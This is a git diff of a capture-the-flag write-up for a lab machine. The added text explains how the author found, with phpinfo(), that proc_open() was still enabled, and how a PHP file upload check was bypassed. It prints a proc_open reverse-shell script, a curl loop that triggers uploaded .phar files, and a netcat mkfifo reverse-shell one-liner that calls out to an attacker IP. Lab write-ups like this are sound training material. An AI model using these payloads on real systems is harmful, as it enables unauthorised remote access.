@@ -1,8 +1,8 @@
 ![image](https://user-images.githubusercontent.com/105310322/191848802-6425b2c6-cc62-412a-9f6f-9a9e97497148.png)
 
-### Tools: gobuster, feroxbuster, git
+### Tools: gobuster, feroxbuster, git, php
 
-### Vulnerabilities: Reverse Shell file upload, Python sandbox escape, sudo
+### Vulnerabilities: Proc_open() Reverse Shell file upload, Python sandbox escape, sudo
 
 Nmap gives us a webpage and ssh back.
 
@@ -300,11 +300,24 @@ function getExtension($file) {
 </html>
 ```
 
+
+There was one last thing I was missing to figure out why my reverse shell was not working and that was the proc_open() functions in php.
+By creating another payload and sending it to dev.siteisup.htb we are able to print all of the php info.
+
+This link gives a simple explanation how it works.
+https://www.php.net/manual/en/function.phpinfo.php
+
+Note: Be sure to add a bunch of websites to the beginning of this payload too.
+
+```php
 <?php 
 phpinfo();
+```
+Using that script prints alot and in the disable functions section we can see that most are blocked including fsockopen but not proc_open()
 
+![image](https://user-images.githubusercontent.com/105310322/191994679-3a4bcb80-822b-4501-8443-718edd7e283e.png)
 
-There was one last thing I was missing that I got some help on and it was the fact that certain functions in php were disabled. Except for proc_open. The link below gives the script and all you have to do is put in your reverse shell/
+The link below gives the script and all you have to do is put in your reverse shell.
 
 https://www.php.net/manual/en/function.proc-open.php
 
@@ -318,6 +331,9 @@ Now we can take everything that checker.php is checking for and form our payload
 3. Use a proc_open script with your reverse shell.
 4. Make sure your burp suite is ready to go with ```Special-Dev: only4dev```
 5. Alternatively you can run this Curl command from another user ```curl -H 'Special-Dev: only4dev' -s http://dev.siteisup.htb/uploads/ | grep "\[DIR\]" | cut -d "\"" -f 8 > folder-names; while read -r line; do curl -v -H 'Special-Dev: only4dev' "http://dev.siteisup.htb/uploads/${line}<PHAR-FILE-NAME>.phar"; done < folder-names``` and it should work but I have not tested.
+
+
+
 
 
 
@@ -350,6 +366,7 @@ http://siteisdown.htb
 http://siteisdown.htb
 http://siteisdown.htb
 
+
 <?php
 $descriptorspec = array(
    0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
@@ -378,8 +395,7 @@ if (is_resource($process)) {
 }
 ?>
 ```
-
-
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.14.83 1234 >/tmp/f
 ```console
 └──╼ [★]$ nc -lvnp 1234
 Ncat: Version 7.92 ( https://nmap.org/ncat )
